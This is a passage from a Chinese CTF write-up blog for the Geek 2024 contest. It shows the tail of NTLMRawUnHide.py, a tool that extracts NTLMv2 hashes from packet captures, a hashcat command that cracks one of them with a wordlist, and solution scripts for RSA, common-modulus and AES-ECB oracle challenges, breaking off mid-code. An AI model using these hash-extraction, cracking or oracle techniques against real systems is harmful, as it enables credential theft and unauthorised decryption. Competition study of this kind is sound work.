decode_string(domain)</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + server_challenge.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntproofstr.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntlmv2_response.<span class="built_in">hex</span>()</span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>(hash_out)</span><br><span class="line">                    <span class="keyword">if</span> outfile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        writeOutfile(outfile, hash_out)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Reset variable</span></span><br><span class="line">                server_challenge = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;31mServer Challenge not found... can&#x27;t create crackable hash :-/\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Continue forever if follow is set, until ctrl-c</span></span><br><span class="line">    <span class="keyword">if</span> follow == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            searchCaptureFile(infile, outfile, verbose, follow, quiet, last_byte)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="comment"># Gracefully exit on ctrl-c</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Can a tool be a tool without ASCII Art?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="comment"># Start yellow</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;93m                                                              /%(&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                               -= Find NTLMv2 =-          ,@@@@@@@@&amp;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;           /%&amp;@@@@&amp;,            -= hashes w/ =-          %@@@@@@@@@@@*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;         (@@@@@@@@@@@(       -= NTLMRawUnHide.py =-    *@@@@@@@@@@@@@@@.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;        &amp;@@@@@@@@@@@@@@&amp;.                             @@@@@@@@@@@@@@@@@@(&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;      ,@@@@@@@@@@@@@@@@@@@/                        .%@@@@@@@@@@@@@@@@@@@@@&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;     /@@@@@@@#&amp;@&amp;*.,/@@@@(.                            ,%@@@@&amp;##(%@@@@@@@@@.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;    (@@@@@@@(##(.         .#&amp;@%%(                .&amp;&amp;@@&amp;(            ,/@@@@@@#&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;   %@@@@@@&amp;*/((.         #(                           ,(@&amp;            ,%@@@@@@*&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;  @@@@@@@&amp;,/(*                                           ,             .,&amp;@@@@@#&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot; @@@@@@@/*//,                                                            .,,,**&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   .,,  ...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                    .#@@@@@@@(.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                   /@@@@@@@@@@@&amp;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                   .@@@@@@@@@@@*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                                     .(&amp;@@@%/.  ..&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                               (@@&amp;     %@@.   .@@@,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                          /@@#          @@@,         %@&amp;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                               &amp;@@&amp;.    @@@/    @@@#&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                          .    %@@@(   ,@@@#    @@@(     ,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                         *@@/         .@@@@@(          #@%&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                          *@@%.      &amp;@@@@@@@@,      /@@@.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                           .@@@@@@@@@@@&amp;. .*@@@@@@@@@@@/.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                              .%@@@@%,        /%@@@&amp;(.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># Regular white text</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;97m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print basic usage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="comment"># Bold white text</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[1;37m&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;usage: NTLMRawUnHide.py -i &lt;inputfile&gt; [-o &lt;outputfile&gt;] [-f] [-h] [-q] [-v]&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># Regular white text</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;97m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display verbose help</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showhelp</span>():</span><br><span class="line">    usage()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Main options:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  -f, --follow               Continuously &quot;follow&quot; (e.g. &quot;read from&quot;)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             input file for new data&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -h, --help&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -i, --input  &lt;inputfile&gt;   Binary packet data input file&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             (.pcap, .pcapng, .cap, .etl, others?)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -o, --output &lt;outputfile&gt;  Output file to record any found NTLM&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             hashes&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -q, --quiet                Be a lot more quiet and only output&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             found NTLM hashes. --quiet will also&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                             disable verbose, if specified.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  -v, --verbose&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check to see if command line args were sent</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> argv:</span><br><span class="line">        banner()</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Default option values</span></span><br><span class="line">    infile = <span class="string">&quot;&quot;</span></span><br><span class="line">    outfile = <span class="string">&quot;&quot;</span></span><br><span class="line">    verbose = <span class="literal">False</span></span><br><span class="line">    follow = <span class="literal">False</span></span><br><span class="line">    quiet = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Process command line args</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(</span><br><span class="line">            argv, <span class="string">&quot;hvqfi:o:&quot;</span>, [<span class="string">&quot;input=&quot;</span>, <span class="string">&quot;output=&quot;</span>, <span class="string">&quot;verbose&quot;</span>, <span class="string">&quot;follow&quot;</span>, <span class="string">&quot;quiet&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError:</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> opt, arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>, <span class="string">&quot;--help&quot;</span>):</span><br><span class="line">            banner()</span><br><span class="line">            showhelp()</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--input&quot;</span>):</span><br><span class="line">            infile = arg</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>):</span><br><span class="line">            outfile = arg</span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--follow&quot;</span>):</span><br><span class="line">            follow = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>):</span><br><span class="line">            verbose = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> opt <span class="keyword">in</span> (<span class="string">&quot;-q&quot;</span>, <span class="string">&quot;--quiet&quot;</span>):</span><br><span class="line">            quiet = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            usage()</span><br><span class="line">            sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check to make sure input file is specified</span></span><br><span class="line">    <span class="keyword">if</span> infile == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;\033[1;31m[!]\033[0;97m Error: Input file not specified.  Did you mean to specify -i?&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check to make sure input file exists</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(infile) == <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m[!]\033[0;97m Error: Input file not found.&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> quiet == <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Ensure we will be quiet</span></span><br><span class="line">        verbose = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        banner()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If infile is specified, get things kicked off</span></span><br><span class="line">    <span class="keyword">if</span> infile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="comment"># Bold white text</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[1;37mSearching&quot;</span>, infile, <span class="string">&quot;for NTLMv2 hashes...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> outfile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Writing output to:&quot;</span>, outfile)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Regular white text</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;97m&quot;</span>)</span><br><span class="line">        searchCaptureFile(infile, outfile, verbose, follow, quiet, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hashcat -m <span class="number">5600</span> starven.txt /tools/rockyou.txt</span><br><span class="line">hashcat -m <span class="number">5600</span> starven.txt /tools/rockyou.txt --show</span><br></pre></td></tr></table></figure><p>提取出密码为spellorstarve，即为压缩包的密码。</p><h1 id="Crypto">Crypto</h1><h2 id="RSA">RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line"><span class="string">p = 192173332221883349384646293941837353967</span></span><br><span class="line"><span class="string">q = 172282016556631997385463935089230918399</span></span><br><span class="line"><span class="string">c = 5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>很符合新生赛难度</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;RSA_is_easy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="不是套娃">不是套娃</h2><p>题目附件 <a href="https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw">https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw</a> 提取码：game<br>粗看是一个压缩包套娃<br>第一关摩斯密码<br><img src="/img/WP/geek2024/tw1.png" alt=""><br>第二关维吉利亚<br><img src="/img/WP/geek2024/tw2.png" alt=""><br>第三关哈希密码逆向<br>哈希字符串为a1fdbce928af7aae<br><a href="http://www.somd5.com">http://www.somd5.com</a><br><a href="http://www.cmd5.com">http://www.cmd5.com</a><br>随便一个网站逆出它，为HaiKav<br>第四关  NEFICPIC&amp;CRTCTNEYO<br>随波逐流yyds<br><img src="/img/WP/geek2024/tw4.png" alt=""><br>NICECTF&amp;NICECRYPTO<br>第五关<br>提示给的很明显<br>base100 -&gt; rot13 -&gt; base64 -&gt; base65536<br>base100:<a href="https://ctf.bugku.com/tool/base100">https://ctf.bugku.com/tool/base100</a><br>base65536:<a href="https://www.better-converter.com/Encoders-Decoders/Base65536-Decode">https://www.better-converter.com/Encoders-Decoders/Base65536-Decode</a><br><img src="/img/WP/geek2024/tw5.png" alt=""><br>原爞，启动！<br>什么？不对？幸亏 <code>原神，启动！</code> 是对的<br>最后就拿到flag了，flag竟然没藏（嘘）</p><h2 id="共模攻击">共模攻击</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] </span><br><span class="line">n = p*q</span><br><span class="line">e = [getPrime(<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = [<span class="built_in">pow</span>(m, e[i], n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line"><span class="string">e1 = 911</span></span><br><span class="line"><span class="string">e2 = 967</span></span><br><span class="line"><span class="string">c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line"><span class="string">c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>家人们真是共模攻击，出的也很基础<br>套公式就行</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">e1 = <span class="number">911</span></span><br><span class="line">e2 = <span class="number">967</span></span><br><span class="line">c1 = <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2 = <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;U_can_really_attack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ECBpad">ECBpad</h2><p>跟BaseCTF2024 week4的 <strong>ECB是不安全的</strong> 很像（一模一样），当时恰好尝试过，但是不会，抄题解不会还不会吧。<br>于是就抄了，原理人家在题解写的很清楚，贴个连接<br><a href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">38312</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">c = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line">length1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">    d = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(d.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) != <span class="built_in">len</span>(c):</span><br><span class="line">        length1 = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">length_flag = <span class="built_in">len</span>(c) - length1</span><br><span class="line"><span class="built_in">print</span>(length_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从前往后爆破flag</span></span><br><span class="line">payload_length = <span class="built_in">len</span>(c) + <span class="number">16</span>  <span class="comment"># 多一个分组保容错</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(payload_length - <span class="number">1</span>, payload_length - <span class="number">1</span> - length_flag, -<span class="number">1</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">    d = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(d.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;a&quot;</span> * i + flag + <span class="built_in">chr</span>(j).encode()</span><br><span class="line">        p.sendline(payload1)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">        e = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(d)</span><br><span class="line">        e = <span class="built_in">bytes</span>.fromhex(e.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">        e = e[payload_length - <span class="number">16</span> : payload_length]</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">in</span> d:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j).encode()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;# 从后往前爆破flag(此方法需要知道填充模式)</span></span><br><span class="line"><span class="string">from Crypto.Util.Padding import pad</span></span><br><span class="line"><span class="string">from Crypto.Cipher import AES</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 在前面填充到满足AES加密的分组长度</span></span><br><span class="line"><span class="string">dic=&#x27;&#123;&#125;-BCTF0123456789abcdef&#x27;</span></span><br><span class="line"><span class="string">flag=b&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(length_flag):</span></span><br><span class="line"><span class="string">    p.recvline()    # b&quot;:\n&quot;</span></span><br><span class="line"><span class="string">    server_payload=b&#x27;a&#x27;*(length1+i+1)</span></span><br><span class="line"><span class="string">    p.sendline(server_payload)</span></span><br><span class="line"><span class="string">    server_flag=p.recvline()[:-1]</span></span><br><span class="line"><span class="string">    server_flag=base64.b64decode(server_flag)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    for j in dic:</span></span><br><span class="line"><span class="string">        p.recvline()    # b&quot;:\n&quot;</span></span><br><span class="line"><span class="string">        my_payload=j.encode()+flag</span></span><br><span class="line"><span class="string">        my_payload=pad(my_payload,AES.block_size)</span></span><br><span class="line"><span class="string">        my_payload=my_payload+b&#x27;a&#x27;  # 我也不知道这里为什么要多加一个字节,当i=2时不加这个字节就会出错</span></span><br><span class="line"><span class="string">        p.sendline(my_payload)</span></span><br><span class="line"><span class="string">        my_flag=p.recvline()[:-1]</span></span><br><span class="line"><span class="string">        my_flag=base64.b64decode(my_flag)</span></span><br><span class="line"><span class="string">        my_flag=my_flag[:16]</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if my_flag in server_flag:</span></span><br><span class="line"><span class="string">            flag=j.encode()+flag</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    print(flag)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="LLL">LLL</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">327</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">a = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = 